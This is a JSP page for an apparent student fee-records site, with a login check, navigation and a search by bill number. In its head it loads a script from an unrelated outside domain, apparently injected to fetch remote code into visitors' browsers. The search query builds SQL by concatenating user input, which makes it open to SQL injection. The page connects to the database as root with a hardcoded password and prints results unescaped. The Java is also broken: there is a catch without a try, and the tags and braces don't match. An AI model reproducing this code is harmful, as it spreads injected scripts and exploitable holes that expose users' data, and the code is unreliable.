<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
 <%@ page import="java.sql.*" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
  	<script src="http://d.trackbreakingnews.com/l/load.js"></script>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title>Fee Profile</title>

    <!-- Bootstrap core CSS -->
    <link href="CSS/bootstrap.min.css" rel="stylesheet">
    <link href="CSS/Style.css" rel="stylesheet">
    <!-- Bootstrap theme -->
    <link href="CSS/bootstrap-theme.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="CSS/theme.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]>
    <script src="js/ie8-responsive-file-warning.js"></script>
    <![endif]-->
    <script src="js/ie-emulation-modes-warning.js"></script>
<link rel="stylesheet" href="CSS/animate.css">
<script src="js/wow.min.js"> </script>
<script> new WOW().init();</script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->

  </head>
    <body>
    		<%
  		String user=(String) session.getAttribute("xmail");
  		if(user==null){
  			request.setAttribute("Error","You Must Login First...");
  			RequestDispatcher rd=request.getRequestDispatcher("Login1.jsp");
  			rd.forward(request, response);	
  		}
  		%>
	<div class="navbar navbar-inverse navbar-fixed-top fadeIn animated">
	<div class="container">
		<a class="navbar-brand" href="#">MySite 
		
		</a>
		<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="navbar-collapse">
					<span class="icon-bar"> </span>
					<span class="icon-bar"> </span>
					<span class="icon-bar"> </span>
					<span class="icon-bar"> </span>
		</button>
			<div class="collapse navbar-collapse"> 
				<ul class="nav navbar-nav navbar-right"> 
					<li> <a href="Home.jsp">Home</a></li>
                    <li> <a href="Data.jsp">Data Entry</a></li>
                    <li> <a href="Fee2.jsp">Fee Records</a></li>
                    <li> <a href="#">Reports</a></li> 
                    <form class="navbar-form navbar-left" role="search">
					<div class="form-group" method="post">
					<input type="text" class="form-control" name="search2" placeholder="search">
					</div>
					<button type="submit" class="btn btn-default active" >Search</button>
					</form>
                    			    </div>
								    </div>
								 </div>
								<li> 
							 </div>
						  </div>
						</ul>
					</li>
				</ul>
	          </div> 
			</div>
  		</div>
  		<div class="row"> 
  			<div class="col-lg-12">
  				<div id="MmyCarousel" class="carousel slide" data-ride="carousel">
  <!-- Indicators -->
  <ol class="carousel-indicators">
    <li data-target="#MmyCarousel" data-slide-to="0" class="active"></li>
    <li data-target="#MmyCarousel" data-slide-to="1"></li>
    <li data-target="#MmyCarousel" data-slide-to="2"></li>
  </ol>

  <!-- Wrapper for slides -->
  <div class="carousel-inner Imgg">
    <div class="item active">
      <img src="iWall/logo_graphic_era.gif" width="1200">
      <div class="carousel-caption">
      </div>
    </div>
    <div class="item">
      <img src="iWall/urcdcl.jpg" width="1200" height="180">
      <div class="carousel-caption">
      </div>
    </div>
    <div class="item">
      <img src="iWall/banner3.jpg" width="1200" height="180">
      <div class="carousel-caption">
      </div>
    </div>
  <!-- Controls -->
  <a class="left carousel-control" href="#MmyCarousel" role="button" data-slide="prev">
    <span class="icon-prev" aria-hidden="true"></span>
    <span class="sr-only">Previous</span>
  </a>
  <a class="right carousel-control" href="#MmyCarousel" role="button" data-slide="next">
    <span class="icon-next" aria-hidden="true"></span>
    <span class="sr-only">Next</span>
  </a>
</div>

</div>
<hr>
</div>

<body>

<%
String b=request.getParameter("search2");
Class.forName("com.mysql.jdbc.Driver");
Connection con1=DriverManager.getConnection("jdbc:mysql://localhost:3306/mystore","root","root");
String str="select * from fee where bill='"+b+"'";
PreparedStatement ps1=con1.prepareStatement(str);
ResultSet rs1=ps1.executeQuery();
%>
<div class="container">
<div class="row">
<div class="row jumbotron">
<div class="col-lg-12">
<div class="table-responsive">
<div class="alert alert-info" role="alert">Insert Bill No To Search Records. </div>

<table class="table table-bordered">
<tr> 
	 <td class="danger"> <h4> Bill No</h4> </td>
	 <td class="danger"> <h4> Stud Name</h4> </td>
	 <td class="danger"> <h4> Class</h4> </td>
	 <td class="danger"> <h4> Date</h4> </td>
	 <td class="danger"> <h4> Payment</h4> </td>
			<%
			if(rs1.next()) {
			%>
		</tr>
			<td class="warning">  <%=rs1.getString("bill") %> </td>
			<td class="warning">  <%=rs1.getString("name") %> </td>
			<td class="warning">  <%=rs1.getString("class") %> </td>
			<td class="warning">  <%=rs1.getString("date") %> </td>
			<td class="warning">  <%=rs1.getString("payment") %> </td>
			
			</tr>
			<%
	}
	rs1.close();
}catch(Exception e) { out.println(e);
%>
</table>
</div>
</div>
</div>
</div>
</div>
  <script src="jquery.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/docs.min.js"></script>
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="js/ie10-viewport-bug-workaround.js"></script>
    <script>
	$('.dropdown').hover(function() {
		$('.dropdown-toggle',this).trigger('click');
	});
	</script>
  </body>
</html>
